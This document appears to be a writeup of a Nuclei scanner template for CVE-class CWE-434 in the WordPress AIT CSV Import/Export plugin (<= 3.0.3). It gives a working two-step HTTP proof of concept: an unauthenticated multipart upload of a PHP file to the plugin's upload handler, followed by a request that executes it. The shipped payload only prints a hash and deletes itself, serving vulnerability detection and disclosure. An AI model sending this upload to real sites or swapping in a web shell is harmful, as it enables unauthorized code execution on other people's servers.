# Nuclei Template: WordPress AIT CSV Import Export - Unauthenticated Remote Code Execution
**Template ID:** ait-csv-import-export-rce
**Vulnerability Class:** Unrestricted Upload of File with Dangerous Type
**Severity:** Critical
**CWE:** CWE-434
**Source:** Nuclei Template (`ait-csv-import-export-rce.yaml`)

## Vulnerability Information & PoC

## Description
The AIT CSV Import/Export plugin <= 3.0.3 allows unauthenticated remote attackers to upload and execute arbitrary PHP code. The upload-handler does not require authentication, nor validates the uploaded content.

## Steps to reproduce / Exploit Payload
```http
POST /wp-content/plugins/ait-csv-import-export/admin/upload-handler.php HTTP/1.1
Host: {{Hostname}}
Accept: */*
Content-Type: multipart/form-data; boundary=------------------------ab360007dbae2de8

--------------------------ab360007dbae2de8
Content-Disposition: form-data; name="file"; filename="{{randstr}}.php"
Content-Type: application/octet-stream

sep=;<?php echo md5("{{string}}");unlink(__FILE__);?>

--------------------------ab360007dbae2de8--

GET /wp-content/uploads/{{randstr}}.php HTTP/1.1
Host: {{Hostname}}
```

## References
- https://wpscan.com/vulnerability/10471
- https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/multi/http/wp_ait_csv_rce.rb
